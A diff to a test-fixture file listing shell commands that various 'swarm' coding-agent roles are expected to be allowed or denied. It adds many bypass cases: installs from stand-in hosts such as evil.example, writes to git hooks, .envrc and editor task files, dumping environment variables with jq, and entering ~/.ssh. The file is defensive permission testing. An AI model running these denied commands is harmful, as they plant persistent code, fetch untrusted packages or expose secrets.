@@ -48,14 +48,14 @@
 {"agent": "swarm:dependency-auditor", "command": "pip-audit --format=json", "expect": "deny"}
 {"agent": "swarm:dependency-installer", "command": "apt install jq", "expect": "deny"}
 {"agent": "swarm:dependency-installer", "command": "brew install jq", "expect": "deny"}
-{"agent": "swarm:dependency-installer", "command": "composer install --no-interaction", "expect": "allow"}
+{"agent": "swarm:dependency-installer", "command": "composer install --no-interaction", "expect": "deny"}
 {"agent": "swarm:dependency-installer", "command": "composer remove foo/bar", "expect": "deny"}
-{"agent": "swarm:dependency-installer", "command": "composer require phpstan/phpstan --dev", "expect": "allow"}
+{"agent": "swarm:dependency-installer", "command": "composer require phpstan/phpstan --dev", "expect": "deny"}
 {"agent": "swarm:dependency-installer", "command": "composer update", "expect": "deny"}
-{"agent": "swarm:dependency-installer", "command": "composer update doctrine/orm", "expect": "allow"}
+{"agent": "swarm:dependency-installer", "command": "composer update doctrine/orm", "expect": "deny"}
 {"agent": "swarm:dependency-installer", "command": "git commit -m x", "expect": "deny"}
 {"agent": "swarm:dependency-installer", "command": "git push origin master", "expect": "deny"}
-{"agent": "swarm:dependency-installer", "command": "npm ci", "expect": "allow"}
+{"agent": "swarm:dependency-installer", "command": "npm ci", "expect": "deny"}
 {"agent": "swarm:dependency-installer", "command": "npm uninstall foo", "expect": "deny"}
 {"agent": "swarm:design-orchestrator", "command": "${CLAUDE_PLUGIN_ROOT}/scripts/mem-files.sh write finding --agent x --tag X --file src/App/Foo.php --line 1 --run adhoc --text t --fix f", "expect": "allow"}
 {"agent": "swarm:design-orchestrator", "command": "${CLAUDE_PLUGIN_ROOT}/scripts/mem-manifest.sh register --run adhoc --agent planner --domain design --area . --owner design-orchestrator", "expect": "allow"}
@@ -78,7 +78,7 @@
 {"agent": "swarm:discovery-orchestrator", "command": "git worktree list", "expect": "allow"}
 {"agent": "swarm:discovery-orchestrator", "command": "git worktree remove .claude/worktrees/agent-ae25ffb99d186c453 --force", "expect": "allow"}
 {"agent": "swarm:discovery-orchestrator", "command": "python3 x.py", "expect": "deny"}
-{"agent": "swarm:doc-writer", "command": "cd /tmp/wt && git diff --stat", "expect": "allow"}
+{"agent": "swarm:doc-writer", "command": "cd /tmp/wt && git diff --stat", "expect": "deny"}
 {"agent": "swarm:doc-writer", "command": "composer install", "expect": "deny"}
 {"agent": "swarm:doc-writer", "command": "git add -A", "expect": "allow"}
 {"agent": "swarm:doc-writer", "command": "git commit -m x", "expect": "allow"}
@@ -199,7 +199,7 @@
 {"agent": "swarm:memory-orchestrator", "command": "ls <(rm -rf /tmp/zzz)", "expect": "deny"}
 {"agent": "swarm:memory-orchestrator", "command": "ls > >(rm -rf /tmp/zzz)", "expect": "deny"}
 {"agent": "swarm:memory-orchestrator", "command": "lsof -i", "expect": "deny"}
-{"agent": "swarm:migration-engineer", "command": "cd /tmp/wt && git status --porcelain", "expect": "allow"}
+{"agent": "swarm:migration-engineer", "command": "cd /tmp/wt && git status --porcelain", "expect": "deny"}
 {"agent": "swarm:migration-engineer", "command": "git add -A", "expect": "allow"}
 {"agent": "swarm:migration-engineer", "command": "git commit -m x", "expect": "allow"}
 {"agent": "swarm:migration-engineer", "command": "git push origin master", "expect": "deny"}
@@ -509,3 +509,189 @@
 {"agent": "swarm:vulnerability-scanner", "command": "php vendor/bin/phpmd src text phpmd.xml", "expect": "allow"}
 {"agent": "swarm:vulnerability-scanner", "command": "python3 x.py", "expect": "deny"}
 {"agent": "swarm:vulnerability-scanner", "command": "rm -rf .swarm", "expect": "deny"}
+{"agent": "swarm:security-auditor", "command": "uniq a -out", "expect": "deny"}
+{"agent": "swarm:security-auditor", "command": "uniq -f 1 a -o", "expect": "deny"}
+{"agent": "swarm:vulnerability-scanner", "command": "npm audit --regis=http://127.0.0.1:9", "expect": "deny"}
+{"agent": "swarm:vulnerability-scanner", "command": "npm audit --userc=/tmp/x", "expect": "deny"}
+{"agent": "swarm:dependency-auditor", "command": "npm ls --pref=/tmp", "expect": "deny"}
+{"agent": "swarm:vulnerability-scanner", "command": "npm audit --reg http://x", "expect": "deny"}
+{"agent": "swarm:vulnerability-scanner", "command": "npm audit --@evil:registry=http://x", "expect": "deny"}
+{"agent": "swarm:dependency-auditor", "command": "composer audit --work=/tmp", "expect": "deny"}
+{"agent": "swarm:vulnerability-scanner", "command": "php vendor/bin/deptrac analyse --out=x", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "cat a > .GIT/hooks/pre-commit", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "cat a >> .GiT/config", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "cat a > .Claude/settings.json", "expect": "deny"}
+{"agent": "swarm:quality-fixer", "command": "cd /Users/davidgarciagordo/projects/swarm && cat a > x", "expect": "deny"}
+{"agent": "swarm:quality-fixer", "command": "cd /tmp && git add -A", "expect": "deny"}
+{"agent": "swarm:quality-fixer", "command": "cd wt && git add -A", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "npx -c 'id'", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "npm exec -c 'id'", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "npm x -c 'id'", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "npm -c id exec", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "npx -y cowsay hi", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "npx --ca=id", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "npx -p cowsay cowsay hi", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "npx --package=cowsay cowsay", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "jq . a | python3", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "jq . a | node", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "jq . a | php", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "cat a | python3 x.py", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "cat a | npx node", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "python3 -", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "python3 /dev/stdin", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "node -", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "make -f -", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "make --file=-", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "php -a", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "node -i", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "python3 -i", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "python3 -W ignore -i x.py", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "python3", "expect": "deny"}
+{"agent": "swarm:security-auditor", "command": "SWARM_ROOT=newdir/.swarm ${CLAUDE_PLUGIN_ROOT}/scripts/mem-lock.sh", "expect": "deny"}
+{"agent": "swarm:security-auditor", "command": "uniq -c a", "expect": "allow"}
+{"agent": "swarm:security-auditor", "command": "uniq -f 1 a", "expect": "allow"}
+{"agent": "swarm:implementer", "command": "npx vitest run -c x", "expect": "allow"}
+{"agent": "swarm:implementer", "command": "npm test -- -c x", "expect": "allow"}
+{"agent": "swarm:implementer", "command": "git diff | grep x", "expect": "allow"}
+{"agent": "swarm:implementer", "command": "python3 -m pytest", "expect": "allow"}
+{"agent": "swarm:implementer", "command": "node --test", "expect": "allow"}
+{"agent": "swarm:implementer", "command": "python3 --version", "expect": "allow"}
+{"agent": "swarm:implementer", "command": "php -d memory_limit=-1 vendor/bin/phpstan analyse -a x", "expect": "allow"}
+{"agent": "swarm:implementer", "command": "make test", "expect": "allow"}
+{"agent": "swarm:dependency-installer", "command": "npm install --regis=http://x", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "npm ci --@a:registry=http://x", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "npm --reg http://x install", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "npm install --no-audit --no-fund", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "npm ci --ignore-scripts", "expect": "allow"}
+{"agent": "swarm:dependency-installer", "command": "npm install --ignore-scripts --no-audit --no-fund", "expect": "allow"}
+{"agent": "swarm:dependency-installer", "command": "npm install --ignore-scripts lodash@4.17.21 @types/node --save-dev", "expect": "allow"}
+{"agent": "swarm:dependency-installer", "command": "composer install --no-interaction --no-scripts --no-plugins", "expect": "allow"}
+{"agent": "swarm:dependency-installer", "command": "composer require phpstan/phpstan:^2.1 --dev --no-interaction --no-scripts --no-plugins", "expect": "allow"}
+{"agent": "swarm:dependency-installer", "command": "composer update doctrine/orm --with-dependencies --no-scripts --no-plugins", "expect": "allow"}
+{"agent": "swarm:dependency-installer", "command": "npm install --ignore-scripts --git=/bin/sh github:a/b", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "npm install --ignore-scripts --node-gyp=/tmp/x foo", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "npm install --ignore-scripts -g evil-pkg", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "npm install --ignore-scripts --global evil-pkg", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "npm install --ignore-scripts -C /tmp evil", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "npm install --ignore-scripts --prefix /tmp evil", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "npm install --ignore-scripts https://evil.example/x.tgz", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "npm install --ignore-scripts github:a/b", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "npm install --ignore-scripts git+ssh://git@x/y.git", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "npm install --ignore-scripts ./local-dir", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "npm install --ignore-scripts ../x.tgz", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "npm install --ignore-scripts foo@file:evil.tgz", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "npm install --ignore-scripts foo@github:a/b", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "npm install --ignore-scripts --script-shell=/tmp/x foo", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "npm install --ignore-scripts --userconfig=/tmp/rc foo", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "npm install --ignore-scripts --globalconfig=/tmp/rc foo", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "npm install --ignore-scripts --registry=http://x foo", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "npm install --ignore-scripts --ignore-scripts=false foo", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "npm install lodash", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "npm ci --ignore-scripts foo", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "npm install --ignore-scripts -- foo", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "npm install --ignore-scripts --foreground-scripts foo", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "npm install --ignore-scripts --ignore foo", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "composer install --no-scripts", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "composer install --no-plugins", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "composer require foo/bar --no-scripts --no-plugins -d /tmp", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "composer require foo/bar --no-scripts --no-plugins --working-dir=/tmp", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "composer require --no-scripts --no-plugins", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "composer update --no-scripts --no-plugins", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "composer require https://x/y.git --no-scripts --no-plugins", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "composer require foo/bar --no-scripts --no-plugins --repository=https://evil", "expect": "deny"}
+{"agent": "swarm:dependency-installer", "command": "composer install --no-scripts --no-plugins --no-scr", "expect": "deny"}
+{"agent": "swarm:vulnerability-scanner", "command": "php vendor/bin/phpmd src,tests json cleancode,codesize --minimumpriority 2", "expect": "allow"}
+{"agent": "swarm:vulnerability-scanner", "command": "php vendor/bin/deptrac analyse --config-file=tests/evil.php", "expect": "deny"}
+{"agent": "swarm:vulnerability-scanner", "command": "php vendor/bin/deptrac analyse -c tests/evil.php", "expect": "deny"}
+{"agent": "swarm:vulnerability-scanner", "command": "php vendor/bin/deptrac analyse --cache-file=.git/hooks/pre-commit", "expect": "deny"}
+{"agent": "swarm:vulnerability-scanner", "command": "php vendor/bin/deptrac analyse --config=x", "expect": "deny"}
+{"agent": "swarm:vulnerability-scanner", "command": "php vendor/bin/deptrac analyse --cache-f=x", "expect": "deny"}
+{"agent": "swarm:vulnerability-scanner", "command": "php vendor/bin/deptrac debug:layer x", "expect": "deny"}
+{"agent": "swarm:vulnerability-scanner", "command": "php vendor/bin/deptrac init", "expect": "deny"}
+{"agent": "swarm:vulnerability-scanner", "command": "php vendor/bin/phpmd src text phpmd.xml --cache-file=/tmp/x", "expect": "deny"}
+{"agent": "swarm:vulnerability-scanner", "command": "php vendor/bin/phpmd src text phpmd.xml --cache", "expect": "deny"}
+{"agent": "swarm:vulnerability-scanner", "command": "php vendor/bin/phpmd src text /tmp/evil.xml", "expect": "deny"}
+{"agent": "swarm:vulnerability-scanner", "command": "php vendor/bin/phpmd src text tests/evil.xml", "expect": "deny"}
+{"agent": "swarm:vulnerability-scanner", "command": "php vendor/bin/phpmd src text cleancode,/tmp/e.xml", "expect": "deny"}
+{"agent": "swarm:vulnerability-scanner", "command": "php vendor/bin/phpmd src html cleancode", "expect": "deny"}
+{"agent": "swarm:vulnerability-scanner", "command": "php vendor/bin/phpmd src text phpmd.xml --generate-baseline", "expect": "deny"}
+{"agent": "swarm:vulnerability-scanner", "command": "php vendor/bin/phpmd src text phpmd.xml --baseline-file=x", "expect": "deny"}
+{"agent": "swarm:implementation-orchestrator", "command": "git worktree prune", "expect": "allow"}
+{"agent": "swarm:implementation-orchestrator", "command": "git worktree remove /Users/x/repo/.claude/worktrees/agent-abc123 --force", "expect": "allow"}
+{"agent": "swarm:implementation-orchestrator", "command": "git worktree add /tmp/anywhere main", "expect": "deny"}
+{"agent": "swarm:implementation-orchestrator", "command": "git worktree add .claude/worktrees/agent-x", "expect": "deny"}
+{"agent": "swarm:implementation-orchestrator", "command": "git worktree remove /tmp/x", "expect": "deny"}
+{"agent": "swarm:implementation-orchestrator", "command": "git worktree remove .claude/worktrees/agent-x/../../..", "expect": "deny"}
+{"agent": "swarm:implementation-orchestrator", "command": "git worktree remove /Users/x/.claude/worktrees/agent-a/../../b --force", "expect": "deny"}
+{"agent": "swarm:implementation-orchestrator", "command": "git worktree move .claude/worktrees/agent-x /tmp/y", "expect": "deny"}
+{"agent": "swarm:implementation-orchestrator", "command": "git worktree lock .claude/worktrees/agent-x", "expect": "deny"}
+{"agent": "swarm:implementation-orchestrator", "command": "git worktree remove .claude/worktrees/agent-x .claude/worktrees/agent-y", "expect": "deny"}
+{"agent": "swarm:implementation-orchestrator", "command": "git worktree repair", "expect": "deny"}
+{"agent": "swarm:discovery-orchestrator", "command": "git worktree prune", "expect": "allow"}
+{"agent": "swarm:discovery-orchestrator", "command": "git worktree remove /Users/x/repo/.claude/worktrees/agent-abc123 --force", "expect": "allow"}
+{"agent": "swarm:discovery-orchestrator", "command": "git worktree add /tmp/anywhere main", "expect": "deny"}
+{"agent": "swarm:discovery-orchestrator", "command": "git worktree add .claude/worktrees/agent-x", "expect": "deny"}
+{"agent": "swarm:discovery-orchestrator", "command": "git worktree remove /tmp/x", "expect": "deny"}
+{"agent": "swarm:discovery-orchestrator", "command": "git worktree remove .claude/worktrees/agent-x/../../..", "expect": "deny"}
+{"agent": "swarm:discovery-orchestrator", "command": "git worktree remove /Users/x/.claude/worktrees/agent-a/../../b --force", "expect": "deny"}
+{"agent": "swarm:discovery-orchestrator", "command": "git worktree move .claude/worktrees/agent-x /tmp/y", "expect": "deny"}
+{"agent": "swarm:discovery-orchestrator", "command": "git worktree lock .claude/worktrees/agent-x", "expect": "deny"}
+{"agent": "swarm:discovery-orchestrator", "command": "git worktree remove .claude/worktrees/agent-x .claude/worktrees/agent-y", "expect": "deny"}
+{"agent": "swarm:discovery-orchestrator", "command": "git worktree repair", "expect": "deny"}
+{"agent": "swarm:implementation-orchestrator", "command": "git worktree list", "expect": "allow"}
+{"agent": "swarm:implementation-orchestrator", "command": "git merge --no-ff worktree-agent-abc123", "expect": "allow"}
+{"agent": "swarm:implementation-orchestrator", "command": "git merge --abort", "expect": "allow"}
+{"agent": "swarm:implementation-orchestrator", "command": "git merge --no-verify worktree-agent-abc", "expect": "deny"}
+{"agent": "swarm:implementation-orchestrator", "command": "git merge -s ours worktree-agent-abc", "expect": "deny"}
+{"agent": "swarm:implementation-orchestrator", "command": "git merge --strategy=ours worktree-agent-abc", "expect": "deny"}
+{"agent": "swarm:implementation-orchestrator", "command": "git merge -X theirs worktree-agent-abc", "expect": "deny"}
+{"agent": "swarm:implementation-orchestrator", "command": "git merge feature/x", "expect": "deny"}
+{"agent": "swarm:implementation-orchestrator", "command": "git merge", "expect": "deny"}
+{"agent": "swarm:implementation-orchestrator", "command": "git merge worktree-agent-a worktree-agent-b", "expect": "deny"}
+{"agent": "swarm:implementation-orchestrator", "command": "git merge --no-ff", "expect": "deny"}
+{"agent": "swarm:implementation-orchestrator", "command": "git merge --abort worktree-agent-abc", "expect": "deny"}
+{"agent": "swarm:implementation-orchestrator", "command": "git merge --squash worktree-agent-abc", "expect": "deny"}
+{"agent": "swarm:fact-checker", "command": "jq -n env", "expect": "deny"}
+{"agent": "swarm:fact-checker", "command": "jq -n 'env.HOME'", "expect": "deny"}
+{"agent": "swarm:fact-checker", "command": "jq -n \"env | keys\"", "expect": "deny"}
+{"agent": "swarm:fact-checker", "command": "jq -n -f filter.jq", "expect": "deny"}
+{"agent": "swarm:fact-checker", "command": "jq --from-file f.jq x.json", "expect": "deny"}
+{"agent": "swarm:fact-checker", "command": "jq .env x.json", "expect": "allow"}
+{"agent": "swarm:fact-checker", "command": "jq '.environment' x.json", "expect": "allow"}
+{"agent": "swarm:implementer", "command": "jq -n env", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "jq -n 'env.HOME'", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "jq -n \"env | keys\"", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "jq -n -f filter.jq", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "jq --from-file f.jq x.json", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "jq .env x.json", "expect": "allow"}
+{"agent": "swarm:implementer", "command": "jq '.environment' x.json", "expect": "allow"}
+{"agent": "swarm:orchestrator", "command": "jq -n env", "expect": "deny"}
+{"agent": "swarm:orchestrator", "command": "jq -n 'env.HOME'", "expect": "deny"}
+{"agent": "swarm:orchestrator", "command": "jq -n \"env | keys\"", "expect": "deny"}
+{"agent": "swarm:orchestrator", "command": "jq -n -f filter.jq", "expect": "deny"}
+{"agent": "swarm:orchestrator", "command": "jq --from-file f.jq x.json", "expect": "deny"}
+{"agent": "swarm:orchestrator", "command": "jq .env x.json", "expect": "allow"}
+{"agent": "swarm:orchestrator", "command": "jq '.environment' x.json", "expect": "allow"}
+{"agent": "swarm:implementer", "command": "cat a > .husky/pre-commit", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "cat a >> .husky/pre-commit", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "cat a > .githooks/pre-commit", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "cat a >> .githooks/pre-commit", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "cat a > .mcp.json", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "cat a >> .mcp.json", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "cat a > .envrc", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "cat a >> .envrc", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "cat a > sub/.envrc", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "cat a >> sub/.envrc", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "cat a > .vscode/tasks.json", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "cat a >> .vscode/tasks.json", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "cat a > ./.VSCode/settings.json", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "cat a >> ./.VSCode/settings.json", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "cat a > .HUSKY/x", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "cat a >> .HUSKY/x", "expect": "deny"}
+{"agent": "swarm:implementer", "command": "cat a > docs/husky.md", "expect": "allow"}
+{"agent": "swarm:implementer", "command": "cat a > .mcp.json.md", "expect": "allow"}
+{"agent": "swarm:orchestrator", "command": "cd /", "expect": "deny"}
+{"agent": "swarm:orchestrator", "command": "cd /tmp", "expect": "deny"}
+{"agent": "swarm:orchestrator", "command": "cd /Users/x/.ssh", "expect": "deny"}
+{"agent": "swarm:orchestrator", "command": "cd ..", "expect": "deny"}
+{"agent": "swarm:orchestrator", "command": "cd", "expect": "deny"}
